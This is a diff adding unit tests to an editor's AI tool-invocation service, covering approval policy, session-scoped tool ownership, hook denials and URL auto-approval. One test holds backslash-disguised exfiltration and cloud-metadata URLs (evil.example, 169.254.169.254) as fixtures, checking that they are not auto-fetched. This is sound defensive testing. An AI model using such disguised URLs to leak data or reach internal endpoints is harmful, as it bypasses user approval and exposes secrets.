@@ -4,7 +4,7 @@
  *--------------------------------------------------------------------------------------------*/
 
 import * as assert from 'assert';
-import { Barrier } from '../../../../../../base/common/async.js';
+import { Barrier, DeferredPromise } from '../../../../../../base/common/async.js';
 import { VSBuffer } from '../../../../../../base/common/buffer.js';
 import { CancellationToken, CancellationTokenSource } from '../../../../../../base/common/cancellation.js';
 import { CancellationError, isCancellationError } from '../../../../../../base/common/errors.js';
@@ -14,7 +14,7 @@ import { IAccessibilityService } from '../../../../../../platform/accessibility/
 import { TestAccessibilityService } from '../../../../../../platform/accessibility/test/common/testAccessibilityService.js';
 import { AccessibilitySignal, IAccessibilitySignalService } from '../../../../../../platform/accessibilitySignal/browser/accessibilitySignalService.js';
 import { ICommandService } from '../../../../../../platform/commands/common/commands.js';
-import { ConfigurationTarget, IConfigurationChangeEvent } from '../../../../../../platform/configuration/common/configuration.js';
+import { ConfigurationTarget, IConfigurationChangeEvent, IConfigurationOverrides, IConfigurationValue } from '../../../../../../platform/configuration/common/configuration.js';
 import { TestConfigurationService } from '../../../../../../platform/configuration/test/common/testConfigurationService.js';
 import { ContextKeyService } from '../../../../../../platform/contextkey/browser/contextKeyService.js';
 import { ContextKeyEqualsExpr, ContextKeyExpr, IContextKeyService } from '../../../../../../platform/contextkey/common/contextkey.js';
@@ -24,6 +24,7 @@ import { ExtensionIdentifier } from '../../../../../../platform/extensions/commo
 import { ConfirmationOptionKind } from '../../../../../../platform/agentHost/common/state/protocol/state.js';
 import { ITelemetryService } from '../../../../../../platform/telemetry/common/telemetry.js';
 import { workbenchInstantiationService } from '../../../../../test/browser/workbenchTestServices.js';
+import { IExtensionService } from '../../../../../services/extensions/common/extensions.js';
 import { LanguageModelToolsService } from '../../../browser/tools/languageModelToolsService.js';
 import { IChatToolRiskAssessmentService, IToolRiskAssessment, ToolRiskLevel, ToolRiskPromptKind } from '../../../browser/tools/chatToolRiskAssessmentService.js';
 import { ChatModel, IChatModel } from '../../../common/model/chatModel.js';
@@ -39,6 +40,9 @@ import { MockLanguageModelToolsConfirmationService } from '../../common/tools/mo
 import { IToolResultCompressor } from '../../../common/tools/toolResultCompressor.js';
 import { runWithFakedTimers } from '../../../../../../base/test/common/timeTravelScheduler.js';
 import { ILanguageModelChatMetadata } from '../../../common/languageModels.js';
+import { TerminalToolId } from '../../../common/tools/terminalToolIds.js';
+import { ChatUrlFetchingConfirmationContribution } from '../../../common/tools/builtinTools/chatUrlFetchingConfirmation.js';
+import { InternalFetchWebPageToolId } from '../../../common/tools/builtinTools/tools.js';
 
 // --- Test helpers to reduce repetition and improve readability ---
 
@@ -167,6 +171,15 @@ async function waitForPublishedInvocation(capture: { invocation?: any }, tries =
 	return capture.invocation;
 }
 
+class AutoApprovePolicyTestConfigurationService extends TestConfigurationService {
+	override inspect<T>(key: string, overrides?: IConfigurationOverrides): IConfigurationValue<T> {
+		const result = super.inspect<T>(key, overrides);
+		return key === ChatConfiguration.GlobalAutoApprove
+			? { ...result, policyValue: false as T }
+			: result;
+	}
+}
+
 interface TestToolsServiceSetup {
 	configurationService: TestConfigurationService;
 	chatService: MockChatService;
@@ -180,7 +193,10 @@ interface TestToolsServiceOptions {
 	accessibilitySignalService?: Partial<IAccessibilitySignalService>;
 	telemetryService?: Partial<ITelemetryService>;
 	commandService?: Partial<ICommandService>;
+	extensionService?: Partial<IExtensionService>;
 	dialogService?: IDialogService;
+	configurationService?: TestConfigurationService;
+	confirmationService?: ILanguageModelToolsConfirmationService;
 	/** Called after configurationService is created but before the service is instantiated */
 	configureServices?: (config: TestConfigurationService) => void;
 }
@@ -190,7 +206,7 @@ interface TestToolsServiceOptions {
  * Reduces boilerplate when tests need custom service configurations.
  */
 function createTestToolsService(store: ReturnType<typeof ensureNoDisposablesAreLeakedInTestSuite>, options?: TestToolsServiceOptions): TestToolsServiceSetup {
-	const configurationService = new TestConfigurationService();
+	const configurationService = options?.configurationService ?? new TestConfigurationService();
 	configurationService.setUserConfiguration(ChatConfiguration.ExtensionToolsEnabled, true);
 
 	// Allow tests to configure before service creation
@@ -203,7 +219,7 @@ function createTestToolsService(store: ReturnType<typeof ensureNoDisposablesAreL
 	const contextKeyService = instaService.get(IContextKeyService);
 	const chatService = new MockChatService();
 	instaService.stub(IChatService, chatService);
-	instaService.stub(ILanguageModelToolsConfirmationService, new MockLanguageModelToolsConfirmationService());
+	instaService.stub(ILanguageModelToolsConfirmationService, options?.confirmationService ?? new MockLanguageModelToolsConfirmationService());
 	instaService.stub(IToolResultCompressor, noopToolResultCompressor);
 	const riskAssessmentService = new TestChatToolRiskAssessmentService();
 	instaService.stub(IChatToolRiskAssessmentService, riskAssessmentService);
@@ -219,6 +235,9 @@ function createTestToolsService(store: ReturnType<typeof ensureNoDisposablesAreL
 	}
 	if (options?.commandService) {
 		instaService.stub(ICommandService, options.commandService as ICommandService);
+	}
+	if (options?.extensionService) {
+		instaService.stub(IExtensionService, options.extensionService);
 	}
 	if (options?.dialogService) {
 		instaService.stub(IDialogService, options.dialogService);
@@ -237,7 +256,7 @@ function createTestToolsService(store: ReturnType<typeof ensureNoDisposablesAreL
 function setupRiskGateTool(
 	setup: TestToolsServiceSetup,
 	store: any,
-	opts?: { withConfirmation?: boolean; permissionLevel?: ChatPermissionLevel; advancedEnabled?: boolean; toolId?: string },
+	opts?: { withConfirmation?: boolean; permissionLevel?: ChatPermissionLevel; advancedEnabled?: boolean; toolId?: string; capture?: { invocation?: ChatToolInvocation } },
 ): { invoke: (token?: CancellationToken) => Promise<{ content: { value: string }[] }>; wasInvoked: () => boolean } {
 	const withConfirmation = opts?.withConfirmation ?? true;
 	const permissionLevel = opts?.permissionLevel ?? ChatPermissionLevel.Autopilot;
@@ -255,6 +274,14 @@ function setupRiskGateTool(
 
 	const sessionId = 'riskGateSession';
 	stubGetSession(setup.chatService, sessionId, { requestId: 'req-risk', modeInfo: { permissionLevel } });
+	const capture = opts?.capture;
+	if (capture) {
+		setup.chatService.appendProgress = (_request, progress) => {
+			if (progress instanceof ChatToolInvocation) {
+				capture.invocation = progress;
+			}
+		};
+	}
 
 	return {
 		invoke: (token: CancellationToken = CancellationToken.None) => setup.service.invokeTool(tool.makeDto({ x: 1 }, { sessionId }), async () => 0, token) as Promise<{ content: { value: string }[] }>,
@@ -559,6 +586,26 @@ suite('LanguageModelToolsService', () => {
 			parameters: {},
 			context: undefined,
 		}, async () => 0, CancellationToken.None), /Tool removedTool was not contributed/);
+	});
+
+	test('passes the invocation request id to prepareToolInvocation', async () => {
+		const preparedRequestIds: (string | undefined)[] = [];
+		const tool = registerToolForTest(service, store, 'invocationRequestTool', {
+			prepareToolInvocation: async context => {
+				preparedRequestIds.push(context.invocationRequestId);
+				return undefined;
+			},
+			invoke: async () => ({ content: [{ kind: 'text', value: 'ok' }] }),
+		});
+		const sessionId = 'invocationRequestSession';
+		stubGetSession(chatService, sessionId);
+
+		const withoutRequestId = tool.makeDto({}, { sessionId }, 'call-without-request-id');
+		const withRequestId = tool.makeDto({}, { sessionId }, 'call-with-request-id');
+		await service.invokeTool(withoutRequestId, async () => 0, CancellationToken.None);
+		await service.invokeTool({ ...withRequestId, context: { ...withRequestId.context!, requestId: 'subagent-request' } }, async () => 0, CancellationToken.None);
+
+		assert.deepStrictEqual(preparedRequestIds, [undefined, 'subagent-request']);
 	});
 
 	test('invocation parameters are overridden by input toolSpecificData', async () => {
@@ -1722,6 +1769,72 @@ suite('LanguageModelToolsService', () => {
 		assert.strictEqual(testAccessibilitySignalService.signalPlayedCalls.length, 0, 'accessibility signal should not be played when auto-approve is enabled');
 	});
 
+	test('URL auto-approval does not invoke tools for backslash-disguised destinations', async () => {
+		const config = new TestConfigurationService();
+		config.setUserConfiguration(ChatConfiguration.GlobalAutoApprove, false);
+		config.setUserConfiguration(ChatConfiguration.AutoApprovedUrls, {
+			'https://*.github.com': true,
+			'http://*.github.com:*': true,
+		});
+		const instantiationService = workbenchInstantiationService({ configurationService: () => config }, store);
+		const contribution = instantiationService.createInstance(
+			ChatUrlFetchingConfirmationContribution,
+			parameters => (parameters as { urls: string[] }).urls
+		);
+		const confirmationService = new MockLanguageModelToolsConfirmationService();
+		confirmationService.getPreConfirmAction = ref => contribution.getPreConfirmAction(ref);
+		const setup = createTestToolsService(store, { configurationService: config, confirmationService });
+		const destinations: string[] = [];
+		const tool = registerToolForTest(setup.service, store, InternalFetchWebPageToolId, {
+			prepareToolInvocation: async () => ({
+				confirmationMessages: { title: 'Fetch web page?', message: 'Confirm the destination', allowAutoConfirm: true },
+			}),
+			invoke: async invocation => {
+				const { urls } = invocation.parameters as { urls: string[] };
+				destinations.push(new URL(URI.parse(urls[0]).toString(true)).hostname);
+				return { content: [{ kind: 'text', value: 'Fixture content' }] };
+			},
+		});
+		const cases = [
+			{ url: 'https://evil.example/resource', destinations: [] },
+			{ url: String.raw`https://evil.example\.github.com/collect?leak=<data>`, destinations: [] },
+			{ url: String.raw`https://evil.example\\.github.com/collect?leak=<data>`, destinations: [] },
+			{ url: String.raw`https://169.254.169.254\.github.com/latest/meta-data/`, destinations: [] },
+			{ url: String.raw`https://169.254.169.254\\.github.com/latest/meta-data/`, destinations: [] },
+			{ url: String.raw`http://127.0.0.2:38651\.github.com/exfil?data=fixture`, destinations: [] },
+			{ url: String.raw`https://github.com\.evil.example/resource`, destinations: ['github.com'] },
+			{ url: 'https://api.github.com/resource', destinations: ['api.github.com'] },
+		];
+		const results: { url: string; destinations: string[]; skipped: boolean }[] = [];
+
+		for (const [index, { url }] of cases.entries()) {
+			const sessionId = `backslash-approval-${index}`;
+			const capture: { invocation?: ChatToolInvocation } = {};
+			stubGetSession(setup.chatService, sessionId, { capture });
+			const before = destinations.length;
+			const promise = setup.service.invokeTool(
+				tool.makeDto({ urls: [url] }, { sessionId }, `${index}`),
+				async () => 0,
+				CancellationToken.None
+			);
+			const published = await waitForPublishedInvocation(capture);
+			assert.ok(published, 'Expected the tool invocation to be published');
+			IChatToolInvocation.confirmWith(published, { type: ToolConfirmKind.Skipped });
+			const result = await promise;
+			results.push({
+				url,
+				destinations: destinations.slice(before),
+				skipped: result.content[0].value === 'The user chose to skip the tool call, they want to proceed without running it',
+			});
+		}
+
+		assert.deepStrictEqual(results, cases.map(({ url, destinations }) => ({
+			url,
+			destinations,
+			skipped: destinations.length === 0,
+		})));
+	});
+
 	test('autopilot permission level bypasses global auto-approve check', async () => {
 		// When autopilot is on, tools should auto-approve without needing global auto-approve enabled
 		const { service: testService, chatService: testChatService } = createTestToolsService(store, {
@@ -1826,7 +1939,8 @@ suite('LanguageModelToolsService', () => {
 		const setup = createTestToolsService(store);
 		setup.riskAssessmentService.enabled = true;
 		setup.riskAssessmentService.assessment = { risk: ToolRiskLevel.Red, explanation: 'Deletes source files irreversibly.' };
-		const t = setupRiskGateTool(setup, store);
+		const capture: { invocation?: ChatToolInvocation } = {};
+		const t = setupRiskGateTool(setup, store, { capture });
 
 		const result = await t.invoke();
 
@@ -1835,8 +1949,9 @@ suite('LanguageModelToolsService', () => {
 				invoked: t.wasInvoked(),
 				assessCalls: setup.riskAssessmentService.assessCalls.length,
 				mentionsRisk: String(result.content[0].value).includes('Deletes source files irreversibly.'),
+				confirmation: capture.invocation && IChatToolInvocation.executionConfirmedOrDenied(capture.invocation.toJSON()),
 			},
-			{ invoked: false, assessCalls: 1, mentionsRisk: true },
+			{ invoked: false, assessCalls: 1, mentionsRisk: true, confirmation: { type: ToolConfirmKind.Skipped, source: 'riskAssessment' } },
 		);
 	});
 
@@ -2220,6 +2335,72 @@ suite('LanguageModelToolsService', () => {
 		assert.strictEqual(result.content[0].value, 'auto approved for local');
 	});
 
+	test('bypass approvals never auto-approves create and run task', async () => {
+		const { service: testService, chatService: testChatService } = createTestToolsService(store);
+		const tool = registerToolForTest(testService, store, TerminalToolId.CreateAndRunTask, {
+			prepareToolInvocation: async () => ({
+				confirmationMessages: {
+					title: 'Create and run task?',
+					message: 'This writes tasks.json and runs the task.',
+					allowAutoConfirm: false,
+				},
+			}),
+			invoke: async () => ({ content: [{ kind: 'text', value: 'confirmed' }] })
+		});
+
+		const sessionId = 'test-create-task-always-confirm';
+		const capture: { invocation?: ChatToolInvocation } = {};
+		stubGetSession(testChatService, sessionId, {
+			requestId: 'req1',
+			modeInfo: { permissionLevel: ChatPermissionLevel.AutoApprove },
+			capture,
+		});
+
+		const dto = tool.makeDto({ task: { label: 'build', command: 'npm run build' } }, { sessionId });
+		dto.preApproved = { type: ToolConfirmKind.ConfirmationNotNeeded, reason: 'pre-approved by caller' };
+		const resultPromise = testService.invokeTool(
+			dto,
+			async () => 0,
+			CancellationToken.None
+		);
+		const published = await waitForPublishedInvocation(capture);
+
+		assert.deepStrictEqual({
+			state: published.state.get().type,
+			allowAutoConfirm: published.confirmationMessages?.allowAutoConfirm,
+		}, {
+			state: IChatToolInvocation.StateKind.WaitingForConfirmation,
+			allowAutoConfirm: false,
+		});
+
+		IChatToolInvocation.confirmWith(published, { type: ToolConfirmKind.UserAction });
+		await resultPromise;
+	});
+
+	test('create and run task rejection does not require confirmation', async () => {
+		const { service: testService, chatService: testChatService } = createTestToolsService(store);
+		const tool = registerToolForTest(testService, store, TerminalToolId.CreateAndRunTask, {
+			prepareToolInvocation: async () => ({
+				invocationMessage: 'Task already exists.',
+			}),
+			invoke: async () => ({ content: [{ kind: 'text', value: 'Task already exists.' }] })
+		});
+
+		const sessionId = 'test-create-task-rejection';
+		stubGetSession(testChatService, sessionId, {
+			requestId: 'req1',
+			modeInfo: { permissionLevel: ChatPermissionLevel.AutoApprove },
+		});
+
+		const result = await testService.invokeTool(
+			tool.makeDto({ task: { label: 'build', command: 'npm run build' } }, { sessionId }),
+			async () => 0,
+			CancellationToken.None
+		);
+
+		assert.deepStrictEqual(result, { content: [{ kind: 'text', value: 'Task already exists.' }] });
+	});
+
 	test('shouldAutoConfirm with basic configuration', async () => {
 		// Test basic shouldAutoConfirm behavior with simple configuration
 		const { service: testService, chatService: testChatService } = createTestToolsService(store, {
@@ -2363,6 +2544,34 @@ suite('LanguageModelToolsService', () => {
 			CancellationToken.None
 		);
 		assert.strictEqual(unspecifiedResult.content[0].value, 'unspecified defaults to eligible');
+	});
+
+	test('auto-approve policy restriction disables reusable actions while allowing approval once', async () => {
+		const configurationService = new AutoApprovePolicyTestConfigurationService();
+		const { service: testService, chatService: testChatService } = createTestToolsService(store, { configurationService });
+		const tool = registerToolForTest(testService, store, 'policyRestrictedTool', {
+			prepareToolInvocation: async () => ({
+				confirmationMessages: {
+					title: 'Confirm this action?',
+					message: 'This tool requires confirmation',
+					allowAutoConfirm: true,
+				},
+			}),
+			invoke: async () => ({ content: [{ kind: 'text', value: 'approved once' }] }),
+		});
+		const capture: { invocation?: any } = {};
+		stubGetSession(testChatService, 'policy-restricted-session', { capture });
+
+		const invocation = testService.invokeTool(
+			tool.makeDto({}, { sessionId: 'policy-restricted-session' }),
+			async () => 0,
+			CancellationToken.None,
+		);
+		const published = await waitForPublishedInvocation(capture);
+		assert.strictEqual(published.confirmationMessages?.allowAutoConfirm, false);
+
+		IChatToolInvocation.confirmWith(published, { type: ToolConfirmKind.UserAction });
+		assert.deepStrictEqual(await invocation, { content: [{ kind: 'text', value: 'approved once' }] });
 	});
 
 	test('tool content formatting with alwaysDisplayInputOutput', async () => {
@@ -3984,6 +4193,252 @@ suite('LanguageModelToolsService', () => {
 		assert.strictEqual(tool.id, 'disabledLookupTool');
 	});
 
+	test('session-scoped tools are hidden from discovery and available by ID with explicit ownership', async () => {
+		const owner = URI.parse('test-session:/a');
+		const implementation: IToolImpl = {
+			invoke: async () => ({ content: [{ kind: 'text', value: 'result' }] }),
+		};
+		registerToolForTest(service, store, 'normalTool', implementation, { toolReferenceName: 'normalToolRef' });
+		const scopedTool = registerToolForTest(service, store, 'sessionScopedTool', implementation, {
+			toolReferenceName: 'sessionScopedToolRef',
+			sessionResource: owner,
+		});
+		const result = await service.invokeTool({ ...scopedTool.makeDto({}), toolSessionResource: owner }, async () => 0, CancellationToken.None);
+
+		assert.deepStrictEqual({
+			tools: [...service.getTools(undefined)].map(tool => tool.id),
+			allTools: [...service.getAllToolsIncludingDisabled()].map(tool => tool.id),
+			byName: service.getToolByName('sessionScopedToolRef')?.id,
+			observedTools: service.observeTools(undefined).get().map(tool => tool.id),
+			byId: service.getTool('sessionScopedTool')?.id,
+			result,
+		}, {
+			tools: ['normalTool'],
+			allTools: ['normalTool'],
+			byName: undefined,
+			observedTools: ['normalTool'],
+			byId: 'sessionScopedTool',
+			result: { content: [{ kind: 'text', value: 'result' }] },
+		});
+	});
+
+	suite('session-scoped execution', () => {
+		const owner = LocalChatSessionUri.forSession('tool-owner');
+		const other = LocalChatSessionUri.forSession('other-session');
+		const scopeError = /Tool "scopedTool" is not available in this session/;
+
+		for (const scenario of [
+			{ name: 'missing headless scope', toolSessionResource: undefined, context: undefined },
+			{ name: 'missing scope with owner presentation', toolSessionResource: undefined, context: { sessionResource: owner } },
+			{ name: 'wrong headless scope', toolSessionResource: other, context: undefined },
+			{ name: 'wrong scope with owner presentation', toolSessionResource: other, context: { sessionResource: owner } },
+		]) {
+			test(`rejects ${scenario.name} before invocation, streaming, or hook side effects`, async () => {
+				const effects: string[] = [];
+				const setup = createTestToolsService(store, {
+					commandService: { executeCommand: async () => { effects.push('validateInput'); return undefined; } },
+				});
+				stubGetSession(setup.chatService, 'tool-owner');
+				setup.chatService.appendProgress = () => { effects.push('progress'); };
+				const tool = registerToolForTest(setup.service, store, 'scopedTool', {
+					prepareToolInvocation: async () => { effects.push('prepare'); return undefined; },
+					invoke: async () => { effects.push('invoke'); return { content: [] }; },
+					handleToolStream: async () => { effects.push('stream'); return undefined; },
+				}, { sessionResource: owner, inputSchema: { type: 'object' } });
+				store.add(setup.service.onDidInvokeTool(() => effects.push('invokedEvent')));
+				const dto: IToolInvocation = {
+					...tool.makeDto({}),
+					toolSessionResource: scenario.toolSessionResource,
+					context: scenario.context,
+				};
+				await assert.rejects(setup.service.invokeTool({
+					...dto, preToolUseResult: { permissionDecision: 'deny' },
+				}, async () => 0, CancellationToken.None), scopeError);
+				await assert.rejects(setup.service.invokeTool({
+					...dto, preToolUseResult: { updatedInput: { changed: true } },
+				}, async () => 0, CancellationToken.None), scopeError);
+				assert.throws(() => setup.service.beginToolCall({
+					toolId: tool.id,
+					toolCallId: 'stream',
+					sessionResource: scenario.context?.sessionResource,
+					toolSessionResource: scenario.toolSessionResource,
+					force: true,
+				}), scopeError);
+				assert.deepStrictEqual(effects, []);
+			});
+		}
+
+		test('rejects unauthorized calls before extension activation', async () => {
+			const effects: string[] = [];
+			const setup = createTestToolsService(store, {
+				extensionService: { activateByEvent: async () => { effects.push('activate'); } },
+			});
+			store.add(setup.service.registerToolData({
+				id: 'scopedTool', displayName: 'Scoped Tool', modelDescription: 'Scoped Tool',
+				source: ToolDataSource.Internal, sessionResource: owner,
+			}));
+			store.add(setup.service.onDidInvokeTool(() => effects.push('invokedEvent')));
+			for (const toolSessionResource of [undefined, other]) {
+				await assert.rejects(setup.service.invokeTool({
+					callId: 'call', toolId: 'scopedTool', parameters: {}, context: undefined, toolSessionResource,
+				}, async () => 0, CancellationToken.None), scopeError);
+				assert.throws(() => setup.service.beginToolCall({
+					toolCallId: 'stream', toolId: 'scopedTool', toolSessionResource,
+				}), scopeError);
+			}
+			assert.deepStrictEqual(effects, []);
+		});
+
+		for (const scenario of [
+			{ name: 'owning headless call', toolSessionResource: owner, sessionId: undefined },
+			{ name: 'equal URI value', toolSessionResource: URI.parse(owner.toString()), sessionId: undefined },
+			{ name: 'sibling presentation', toolSessionResource: owner, sessionId: 'sibling-chat' },
+			{ name: 'subagent presentation', toolSessionResource: owner, sessionId: 'subagent-chat' },
+		]) {
+			test(`accepts ${scenario.name} with explicit ownership`, async () => {
+				if (scenario.sessionId) {
+					stubGetSession(chatService, scenario.sessionId);
+				}
+				const calls: { scope: string | undefined; context: string | undefined }[] = [];
+				const tool = registerToolForTest(service, store, 'scopedTool', {
+					invoke: async invocation => {
+						calls.push({ scope: invocation.toolSessionResource?.toString(), context: invocation.context?.sessionResource.toString() });
+						return { content: [{ kind: 'text', value: 'owned' }] };
+					},
+				}, { sessionResource: owner });
+				const result = await service.invokeTool({
+					...tool.makeDto({}, scenario.sessionId ? { sessionId: scenario.sessionId } : undefined),
+					toolSessionResource: scenario.toolSessionResource,
+				}, async () => 0, CancellationToken.None);
+				assert.deepStrictEqual({ result, calls }, {
+					result: { content: [{ kind: 'text', value: 'owned' }] },
+					calls: [{ scope: owner.toString(), context: scenario.sessionId ? LocalChatSessionUri.forSession(scenario.sessionId).toString() : undefined }],
+				});
+			});
+		}
+
+		test('leaves unscoped calls unchanged with or without an explicit scope', async () => {
+			const effects: string[] = [];
+			stubGetSession(chatService, 'sibling-chat');
+			const tool = registerToolForTest(service, store, 'unscopedTool', {
+				invoke: async () => { effects.push('invoke'); return { content: [] }; },
+				handleToolStream: async () => { effects.push('stream'); return undefined; },
+			});
+			for (const toolSessionResource of [undefined, other]) {
+				service.beginToolCall({ toolCallId: 'stream', toolId: tool.id, toolSessionResource });
+				await service.updateToolStream('stream', {}, CancellationToken.None);
+				await service.invokeTool({
+					...tool.makeDto({}, { sessionId: 'sibling-chat' }, 'stream'),
+					toolSessionResource,
+				}, async () => 0, CancellationToken.None);
+			}
+			assert.deepStrictEqual(effects, ['stream', 'stream', 'invoke', 'stream', 'stream', 'invoke']);
+		});
+
+		test('retains explicit streaming ownership and rejects updates after the tool changes sessions', async () => {
+			const effects: string[] = [];
+			const data: IToolData = {
+				id: 'scopedTool', displayName: 'Scoped Tool', modelDescription: 'Scoped Tool',
+				source: ToolDataSource.Internal, sessionResource: owner,
+			};
+			const registration = store.add(service.registerTool(data, {
+				invoke: async () => ({ content: [] }),
+				handleToolStream: async () => { effects.push('ownerStream'); return undefined; },
+			}));
+			stubGetSession(chatService, 'sibling-chat');
+			const invocation = service.beginToolCall({
+				toolCallId: 'stream', toolId: data.id,
+				toolSessionResource: URI.parse(owner.toString()),
+				sessionResource: LocalChatSessionUri.forSession('sibling-chat'),
+			});
+			assert.ok(invocation);
+			await service.updateToolStream('stream', { first: true }, CancellationToken.None);
+			registration.dispose();
+			store.add(service.registerTool({ ...data, sessionResource: other }, {
+				invoke: async () => ({ content: [] }),
+				handleToolStream: async () => { effects.push('replacementStream'); return undefined; },
+			}));
+			await assert.rejects(service.updateToolStream('stream', { second: true }, CancellationToken.None), scopeError);
+			assert.deepStrictEqual(effects, ['ownerStream', 'ownerStream']);
+		});
+
+		test('does not gain streaming ownership when an unscoped tool is replaced by a scoped tool', async () => {
+			const effects: string[] = [];
+			const data: IToolData = {
+				id: 'scopedTool', displayName: 'Scoped Tool', modelDescription: 'Scoped Tool', source: ToolDataSource.Internal,
+			};
+			const registration = store.add(service.registerTool(data, { invoke: async () => ({ content: [] }) }));
+			service.beginToolCall({ toolCallId: 'stream', toolId: data.id, sessionResource: owner, force: true });
+			registration.dispose();
+			store.add(service.registerTool({ ...data, sessionResource: owner }, {
+				invoke: async () => ({ content: [] }),
+				handleToolStream: async () => { effects.push('stream'); return undefined; },
+			}));
+			await assert.rejects(service.updateToolStream('stream', {}, CancellationToken.None), scopeError);
+			assert.deepStrictEqual(effects, []);
+		});
+
+		test('rechecks ownership after asynchronous activation before preparation', async () => {
+			const activating = new DeferredPromise<void>();
+			const activated = new DeferredPromise<void>();
+			const effects: string[] = [];
+			const setup = createTestToolsService(store, {
+				extensionService: {
+					activateByEvent: async () => { activating.complete(); await activated.p; },
+				},
+			});
+			const data: IToolData = {
+				id: 'scopedTool', displayName: 'Scoped Tool', modelDescription: 'Scoped Tool',
+				source: ToolDataSource.Internal, sessionResource: owner,
+			};
+			const registration = store.add(setup.service.registerToolData(data));
+			const result = setup.service.invokeTool({
+				callId: 'call', toolId: data.id, parameters: {}, context: undefined, toolSessionResource: owner,
+			}, async () => 0, CancellationToken.None);
+			const rejected = assert.rejects(result, scopeError);
+			await activating.p;
+			registration.dispose();
+			store.add(setup.service.registerTool({ ...data, sessionResource: other }, {
+				prepareToolInvocation: async () => { effects.push('replacementPrepare'); return undefined; },
+				invoke: async () => { effects.push('replacementInvoke'); return { content: [] }; },
+			}));
+			await activated.complete();
+			await rejected;
+			assert.deepStrictEqual(effects, []);
+		});
+
+		test('rechecks ownership after asynchronous preparation before invoking a replacement', async () => {
+			const preparing = new DeferredPromise<void>();
+			const prepared = new DeferredPromise<void>();
+			const effects: string[] = [];
+			const data: IToolData = {
+				id: 'scopedTool', displayName: 'Scoped Tool', modelDescription: 'Scoped Tool',
+				source: ToolDataSource.Internal, sessionResource: owner,
+			};
+			const registration = store.add(service.registerTool(data, {
+				prepareToolInvocation: async () => {
+					effects.push('ownerPrepare');
+					preparing.complete();
+					await prepared.p;
+					return undefined;
+				},
+				invoke: async () => { effects.push('ownerInvoke'); return { content: [] }; },
+			}));
+			const result = service.invokeTool({
+				callId: 'call', toolId: data.id, parameters: {}, context: undefined, toolSessionResource: owner,
+			}, async () => 0, CancellationToken.None);
+			const rejected = assert.rejects(result, scopeError);
+			await preparing.p;
+			registration.dispose();
+			store.add(service.registerTool({ ...data, sessionResource: other }, {
+				invoke: async () => { effects.push('replacementInvoke'); return { content: [] }; },
+			}));
+			await prepared.complete();
+			await rejected;
+			assert.deepStrictEqual(effects, ['ownerPrepare']);
+		});
+	});
+
 	test('getToolByName returns tool regardless of when clause', () => {
 		contextKeyService.createKey('anotherFlag', false);
 
@@ -4759,6 +5214,25 @@ suite('LanguageModelToolsService', () => {
 				assert.strictEqual(state.reason, ToolConfirmKind.Denied);
 				assert.strictEqual(state.reasonMessage, 'Denied by PreToolUse hook: Destructive operations require approval');
 			}
+			assert.deepStrictEqual(IChatToolInvocation.executionConfirmedOrDenied(invocation.toJSON()), { type: ToolConfirmKind.Denied, source: 'hook' });
+		});
+
+		test('hook denial preserves its source on an existing streaming invocation', async () => {
+			let invoked = false;
+			const tool = registerToolForTest(hookService, store, 'streamingHookDeny', {
+				invoke: async () => { invoked = true; return { content: [] }; },
+			});
+			stubGetSession(hookChatService, 'hook-stream', { requestId: 'req-hook-stream' });
+			const dto = tool.makeDto({}, { sessionId: 'hook-stream' });
+			const invocation = hookService.beginToolCall({ toolId: 'streamingHookDeny', toolCallId: dto.callId, force: true });
+			assert.ok(invocation);
+			dto.preToolUseResult = { permissionDecision: 'deny', permissionDecisionReason: 'Blocked by hook' };
+			const result = await hookService.invokeTool(dto, async () => 0, CancellationToken.None);
+			assert.deepStrictEqual({
+				invoked,
+				error: result.toolResultError,
+				confirmation: IChatToolInvocation.executionConfirmedOrDenied(invocation.toJSON()),
+			}, { invoked: false, error: 'Blocked by hook', confirmation: { type: ToolConfirmKind.Denied, source: 'hook' } });
 		});
 
 		test('when hook allows, tool executes normally', async () => {
